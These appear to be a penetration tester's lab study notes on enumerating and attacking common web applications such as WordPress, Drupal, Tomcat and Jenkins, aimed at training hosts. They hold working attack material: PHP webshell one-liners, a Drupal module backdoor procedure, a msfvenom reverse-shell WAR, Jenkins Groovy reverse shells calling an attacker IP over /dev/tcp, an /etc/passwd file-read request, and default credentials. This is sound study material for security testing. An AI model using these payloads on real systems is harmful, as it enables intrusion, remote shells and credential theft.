##### Basics
- Most common will be web based
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- Examples

|**Category**|**Applications**|
|---|---|
|[Web Content Management](https://enlyft.com/tech/web-content-management)|Joomla, Drupal, WordPress, DotNetNuke, etc.|
|[Application Servers](https://enlyft.com/tech/application-servers)|Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc.|
|[Security Information and Event Management (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem)|Splunk, Trustwave, LogRhythm, etc.|
|[Network Management](https://enlyft.com/tech/network-management)|PRTG Network Monitor, ManageEngine Opmanger, etc.|
|[IT Management](https://enlyft.com/tech/it-management-software)|Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.|
|[Software Frameworks](https://enlyft.com/tech/software-frameworks)|JBoss, Axis2, etc.|
|[Customer Service Management](https://enlyft.com/tech/customer-service-management)|osTicket, Zendesk, etc.|
|[Search Engines](https://enlyft.com/tech/search-engines)|Elasticsearch, Apache Solr, etc.|
|[Software Configuration Management](https://enlyft.com/tech/software-configuration-management)|Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.|
|[Software Development Tools](https://enlyft.com/tech/software-development-tools)|Jenkins, Atlassian Confluence, phpMyAdmin, etc.|
|[Enterprise Application Integration](https://enlyft.com/tech/enterprise-application-integration)|Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.|



| Application          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| WordPress            | [WordPress](https://wordpress.org/) is an open-source Content Management System (CMS) that can be used for multiple purposes. It's often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.                                                                                                                                                                                                                                |
| Drupal               | [Drupal](https://www.drupal.org/) is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.                                                                                                                                                                                                                                                                                                                                                      |
| Joomla               | [Joomla](https://www.joomla.org/) is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify.                                                                                                                                                                                                                                                                                                                             |
| Tomcat               | [Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.                                                                                                                                                                                                                                                                                                                                                                   |
| Jenkins              | [Jenkins](https://jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication.                                                                                                                                                                                                                                                                                                         |
| Splunk               | Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability ([CVE-2018-11409](https://nvd.nist.gov/vuln/detail/CVE-2018-11409)), and an authenticated remote code execution vulnerability in very old versions ([CVE-2011-4642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642)). |
| PRTG Network Monitor | [PRTG Network Monitor](https://www.paessler.com/prtg) is an agentless network monitoring system that can be used to monitor metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from discovered devices. PRTG is written in [Delphi](https://en.wikipedia.org/wiki/Delphi_\(software\)).                                                                                                                                                                                                   |
| osTicket             | [osTicket](https://osticket.com/) is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend.                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| GitLab               | [GitLab](https://about.gitlab.com/) is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both community (free) and enterprises versions of the software.                                                                                                                                                                                                                                                                                                                                      |

- Asset Management
	- Not all assets are known
- Change default credentials
- NMAP the network
- [[eyewitness]] to get a visual record of the applications
- [[aquatone]] to get a visual record of the applications
- enumerate found endpoints
	- versions
	- source code
	- known vulns

##### Wordpress
- [[wpscan]] - powerful tool for enumeration and attacking worpdress
- `/xmlrpc.php` auth API
- `/wp-content/themes/<theme name>` location of themes that may be vuln to code execution
- [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) - metasploit tool to automate theme php code execution
- plugin specific
	- mail-masta
		- `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
	- wpdiscuz
		- [WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/49967)
		- `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`

##### Joomla
- `curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool` check version
- `curl -s http://dev.inlanefreight.local/ | grep Joomla` look for joomla tags
- `curl -s http://dev.inlanefreight.local/README.txt | head -n 5` check out the readme for info
- [[droopscan]] - tool for enumeration and attacking joomla CMS
	- `droopescan scan joomla --url http://dev.inlanefreight.local/`
- [[joomlascan]] 
	- `python2.7 joomlascan.py -u http://dev.inlanefreight.local`
- Joomla bruteforce [GitHub - ajnik/joomla-bruteforce: Joomla login bruteforce](https://github.com/ajnik/joomla-bruteforce)
- attacking
	- admin panel
		- PHP **RCE** via customized templates
			- use on of the php pages to inject RCE payload
			- `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
	- various CVEs out there usually with a module for joomla instead of the core

 ##### Drupal
- Enumerate
	- `curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""`
	- `curl -s http://drupal.inlanefreight.local/CHANGELOG.txt`
	- [[droopscan]] `droopescan scan drupal -u http://drupal.inlanefreight.local`
- Attacking
	- php filter module (older versions) tests php code
		- `curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"`
		- missing in newer versions  DL module `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
	- hide php code in a new module example
		- grab module `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
		- unzip `tar xvf captcha-8.x-1.2.tar.gz`
		- create shell.php `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`
		- create `.htaccess` file to grant access to new module
			```
			<IfModule mod_rewrite.c>
			RewriteEngine On
			RewriteBase /
			</IfModule>
			```
		- move files into module and retar it
			```
			mv shell.php .htaccess captcha
			tar cvf captcha.tar.gz captcha/
			```
		- install module in drupal admin panel
	- Use known CVEs
		- dropalgeddon 1,2,3
		
##### Tomcat
- **Detect** 
	- error pages like 404
	- `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat `
- **structure**
	- `bin` folder stores scripts and binaries needed
	- `conf` folder stores various configuration files
	- `tomcat-users.xml` file stores user credentials and their assigned roles
	- `lib` folder holds the various JAR files
	- `logs` and `temp` folders store temporary log files
	- `webapps` folder is the default webroot
		- `WEB-INF/web.xml` deployment descriptor
		- `WEB-INF/classes` folder contain business logic
		- `lib` folder stores application libraries
		- `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
	-  `work` folder acts as a cache
- **attack**
	- default creds `tomcat:tomcat, admin:admin`
	- enumerate `gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`
	- msfconsole
		- `auxiliary/scanner/http/tomcat_mgr_login/`
			- ```
			  set VHOST web01.inlanefreight.local
			  set RPORT 8180
			  set stop_on_success true
			  set rhosts 10.129.201.58
			  ```
	- [GitHub - b33lz3bub-1/Tomcat-Manager-Bruteforce: This script will bruteforce the credential of tomcat manager or host-manager](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
	- War file upload
		- tennc webshell
			- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
			- Find 'war file to deploy' in the application manager and upload the payload war file
		 ```
		  wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
		  zip -r backup.war cmd.jsp 
		  ```
		  - Navigate to `/{name of war file}/{name of JSP file}`
  - [GitHub - SecurityRiskAdvisors/cmd.jsp: A super small jsp webshell with file upload capabilities.](https://github.com/SecurityRiskAdvisors/cmd.jsp)
	- msvenom
	   ```
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=9000 -f war > backup.war
		nc -lvnp 9000
		```
		- metasplot
			- `exploit/multi/http/tomcat_mgr_upload`
	- CVE-2020-1938 : Ghostcat
		- [CVE Record: CVE-2020-1938](https://www.cve.org/CVERecord?id=CVE-2020-1938)
		- [GitHub - YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi: Tomcat-Ajp协议文件读取漏洞](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
		- `python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml`

##### Jenkins
- **Enumerate**
	- Default port 8080 and 5000
	-  can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all
	- Administrators can also allow or disallow users from creating accounts
	- default creds `admin:admin`
- **Atack**
	- Run groovy scripts `http://jenkins.inlanefreight.local:8000/script`
	- Example payloads
		- Linux run command
			 ```groovy
			  def cmd = 'id'
			  def sout = new StringBuffer(), serr = new StringBuffer()
			  def proc = cmd.execute()
			  proc.consumeProcessOutput(sout, serr)
			  proc.waitForOrKill(1000)
			  println sout
			  ```

		- Reverse shell Linux host
		  ```groovy
		   r = Runtime.getRuntime()
		   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		   p.waitFor()
		   ```
		- Windows run command
			```groovy
			def cmd = "cmd.exe /c dir".execute();
			println("${cmd.text}");
			```
		- windows reverse shell
			```groovy
			String host="localhost";
			int port=8044;
			String cmd="cmd.exe";
			Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
			```


##### Splunk
- **Enumerate**
	- log analytics tool used to gather, analyze and visualize data
	- Typically port 8000 and 8089
	- https://X.X.X.X:8000/en-US/account/login
	- Free does not require auth
- **Attack**
	- [GitHub - 0xjpuff/reverse_shell_splunk: A simple splunk package for obtaining reverse shells on both Windows and most *nix systems.](https://github.com/0xjpuff/reverse_shell_splunk)
	- create a custom splunk application
		- payload
![[Pasted image 20250912125333.png]]
		- Click Install from app file
		- start listener/shell catcher
		- Upload app click browse then select package
		- should catch shell right away

##### PRTG Network Monitor
- monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more
- **Enumerate**
	- Defaults 80;443;8080
	- default credentials `prtgadmin:prtgadmin`
- **Attack**
	- Check for CVEs


##### osTicket
- open-source support ticketing system
- **Enumeration** 
	- Usually has the name on the landing page
	- uses OSTSESSID cookie
- **Attacking**
	- Look for CVEs
	- Abuse its functions with registering an account and sending in tickets

##### Gitlab
- web-based GIT repository host
- secrets or other sensitive information may be posted to git repos
- **Enumerate**
	- landing page will have name
	- /help will have version
	- /explore will have public projects
- **Attacking**
	- Find CVEs
	- User enumeration via sign up

##### Attacking Tomcat GCI
- Enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.
- Runs on apache2 mostly
- Scripts can be C/C++, Java, perl, etc
- Parameter is usually to do an action, like look something up
- **Enumeration**
	- nmap scan to discover CGI services
	- [[ffuf]] root/cgi/*.* for possible functions
- **Attacking**
	- Use command injection if its turned on
		- Example `/cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe 
	- Find exploits for the CGI engine version
	- **Shellshock**

##### Attacking Thick Clients
- Applications that are installed locally 
- Can be coded in various languages like C++, Java, .NET, etc
- 2 tier - comms between app and DB
- 3 tier- comms between app, server, and DB
- **Enumeration**
	- Tools
		- CFF explorer https://ntcore.com/?page_id=388
		- Detect It Easy https://github.com/horsicq/Detect-It-Easy
		- Process Monitor https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
		- Strings https://learn.microsoft.com/en-us/sysinternals/downloads/strings
- **Attacking**
	- Tools
		- Ghidra https://www.ghidra-sre.org/
		- IDA https://hex-rays.com/ida-pro/
		- OlyDbg http://www.ollydbg.de/
		- Radare2 https://www.radare.org/r/index.html
		- dnSpy https://github.com/dnSpy/dnSpy
		- x64dbg https://x64dbg.com/
		- JADX https://github.com/skylot/jadx
		- JD-GUI http://java-decompiler.github.io/
		- Frida https://frida.re/
		- TCPView https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview
		- Wireshark
		- TCPdump
		- Burp Suite
	- Methodology
		- Use procmon to see what files, regs, etc the app is interacting with
		- Use x64dbg to 
			- check magic bytes of files
			- Dump memory to file and run strings against bin file
			- dnSPY to look at .NET source code
		- Use JD-GUI to decompile Java

##### Coldfusion

|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|

- **Enumeration**
	- admin portal `/CFIDE/administrator`
	- file extensions `.cfm`

|**Method**|**Description**|
|---|---|
|`Port Scanning`|ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.|
|`File Extensions`|ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.|
|`HTTP Headers`|Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.|
|`Error Messages`|If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.|
|`Default Files`|ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.|